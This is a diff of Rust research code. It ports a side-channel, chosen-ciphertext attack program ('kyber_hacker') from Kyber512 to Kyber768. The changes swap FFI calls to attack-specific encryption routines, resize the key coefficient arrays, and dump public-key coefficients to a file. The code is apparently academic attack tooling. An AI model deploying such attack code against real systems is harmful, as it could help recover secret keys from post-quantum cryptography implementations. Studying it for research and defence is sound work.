@@ -1,8 +1,8 @@
 use crypto_attacker::*;
 use libaugury_ffi_sys::{c_sleep, pin_cpu, flush_evset};
-use libkyber_ffi_sys::{pqcrystals_kyber512_ref_enc_attack, pqcrystals_kyber512_ref_enc_fake, 
+use libkyber_ffi_sys::{pqcrystals_kyber768_ref_enc_attack, pqcrystals_kyber768_ref_enc_fake, 
     KYBER_SYMBYTES, CRYPTO_PUBLICKEYBYTES, CRYPTO_BYTES, 
-    CRYPTO_CIPHERTEXTBYTES, KYBER_N, pqcrystals_kyber512_ref_indcpa_get_pk_coef};
+    CRYPTO_CIPHERTEXTBYTES, KYBER_N, KYBER_K, pqcrystals_kyber768_ref_indcpa_get_pk_coef};
 // std lib
 use std::os::raw::{c_int, c_uchar};
 use std::env::args;
@@ -162,7 +162,7 @@ fn kyber_hacker(
 
                 // Chosen-Cipher for no flip
                 unsafe {
-                    match pqcrystals_kyber512_ref_enc_attack(ct_rand.as_mut_ptr() as *mut c_uchar, 
+                    match pqcrystals_kyber768_ref_enc_attack(ct_rand.as_mut_ptr() as *mut c_uchar, 
                     ss.as_mut_ptr() as *mut c_uchar, pk.as_ptr() as *const c_uchar, ptr.as_mut_ptr() as *mut u64, 
                     0, 0, rand_mask) {
                         0 => (),
@@ -231,17 +231,17 @@ fn kyber_hacker(
     }
 
     // Store the pk coefficients
-    let mut coeffs_vec_t: [i16; 2*KYBER_N as usize] = [0; 2*KYBER_N as usize];
-    let mut coeffs_vec_a: [i16; 4*KYBER_N as usize] = [0; 4*KYBER_N as usize];
-    unsafe{ pqcrystals_kyber512_ref_indcpa_get_pk_coef(pk.as_ptr() as *const c_uchar, 
+    let mut coeffs_vec_t: [i16; KYBER_K*KYBER_N as usize] = [0; KYBER_K*KYBER_N as usize];
+    let mut coeffs_vec_a: [i16; KYBER_K*KYBER_K*KYBER_N as usize] = [0; KYBER_K*KYBER_K*KYBER_N as usize];
+    unsafe{ pqcrystals_kyber768_ref_indcpa_get_pk_coef(pk.as_ptr() as *const c_uchar, 
         coeffs_vec_a.as_mut_ptr() as *mut i16, coeffs_vec_t.as_mut_ptr() as *mut i16); }
     // Store the public key
     let pk_file_path: &str = "kyber_pub.txt";
     let mut pk_file: File = File::create(pk_file_path).unwrap();
-    for i in 0..4*KYBER_N as usize{
+    for i in 0..KYBER_K*KYBER_K*KYBER_N as usize{
         write!(pk_file, "{}\n", coeffs_vec_a[i]).unwrap();
     }
-    for i in 0..2*KYBER_N as usize{
+    for i in 0..KYBER_K*KYBER_N as usize{
         write!(pk_file, "{}\n", coeffs_vec_t[i]).unwrap();
     }
 
@@ -271,7 +271,7 @@ fn kyber_hacker(
             get_ptr_ct(ptr.as_mut_ptr() as *mut u64, target_addr, pointer_idx, rand_mask, &mut rng);
             // Chosen-Cipher for no flip
             unsafe {
-                match pqcrystals_kyber512_ref_enc_attack(ct.as_mut_ptr() as *mut c_uchar, 
+                match pqcrystals_kyber768_ref_enc_attack(ct.as_mut_ptr() as *mut c_uchar, 
                 ss.as_mut_ptr() as *mut c_uchar, pk.as_ptr() as *const c_uchar, ptr.as_mut_ptr() as *mut u64, 
                 8, 0, rand_mask) {
                     0 => (),
@@ -280,7 +280,7 @@ fn kyber_hacker(
             }
             // Chosen-Cipher for flip
             unsafe {
-                match pqcrystals_kyber512_ref_enc_attack(ct_tmp.as_mut_ptr() as *mut c_uchar, 
+                match pqcrystals_kyber768_ref_enc_attack(ct_tmp.as_mut_ptr() as *mut c_uchar, 
                 ss.as_mut_ptr() as *mut c_uchar, pk.as_ptr() as *const c_uchar, ptr.as_mut_ptr() as *mut u64, 
                 8, 1, rand_mask) {
                     0 => (),
